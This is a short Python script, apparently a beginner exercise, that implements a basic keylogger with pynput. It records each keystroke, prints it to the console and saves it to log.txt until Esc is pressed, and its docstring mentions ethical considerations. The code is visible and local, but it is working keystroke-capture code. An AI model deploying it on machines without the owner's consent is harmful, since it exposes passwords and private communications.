""""               "Simple Keylogger"
Create a basic keylogger program tht records and logs keystrokes.
Focus on logging the keys pressed andsaving them to a file. 
Note: Ethical considerations and permissions are crucial for projects involving keyloggers."""

import pynput
from pynput.keyboard import Key,Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed '.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # removing  space ' '
            k = str(key).replace("'","")
            f.write(k)

            # every keystroke from readability
            f.write(" ")


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:   # you are see is focus the Key
        #stop Listner
        return False

with Listener(on_press=on_press,
                on_release=on_release) as listener:
    listener.join()
